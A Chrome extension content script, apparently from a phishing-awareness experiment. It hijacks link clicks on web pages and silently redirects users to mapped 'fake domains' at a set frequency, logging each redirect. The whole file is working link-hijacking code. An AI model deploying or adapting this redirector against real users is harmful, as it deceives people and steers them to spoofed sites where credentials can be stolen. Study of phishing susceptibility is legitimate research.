// ariel's script for changing URLs in pages so they point to our fake domains

var mapping = {};
var links_to_change = [];
var mode;

chrome.runtime.sendMessage({method:'initData'}, onSettingsReceived);
chrome.runtime.sendMessage({method:'getMode'}, function(response){mode = response.mode;});
	
function onSettingsReceived (response) {
    settings = response.settings;
    groupData = response.groupData;
	fakeSiteData = response.fakeSiteData;

	var obj = fakeSiteData['fake_domains'];
	for (var original in obj) {
		if (obj.hasOwnProperty(original)) {
			mapping[original] = obj[original];
			links_to_change.push(original);
		}
	}
	if(mode > 0 && Math.random() < groupData['script_freq'])
		init2();
}

function change_link(link_obj, href_name, href_old, href_new) {
	link_obj.onclick = function() {
		logAction(link_obj, href_old, href_new);
		window.location.href = href_new;
		return false;
	};
}

function init2(){
	var links = document.links;
	for(var i = 0; i < links.length; i++){
		for(var j = 0; j < links_to_change.length; j++){
			if(window.location.href.indexOf(links_to_change[j]) === -1 && links[i].href.indexOf(links_to_change[j]) > -1){
				items = mapping[links_to_change[j]];
				change_link(links[i], links_to_change[j], links[i].href, items[Math.floor(Math.random()*items.length)]);
			}
		}
	}
}

function logAction (actionName, choice, feedback) {
    var pendingURL = settings['pendingURL'];
	chrome.runtime.sendMessage({method: 'logAction', action: actionName, data: [pendingURL, choice, feedback].join(':'), hostname: new URL(window.location.href).hostname});
}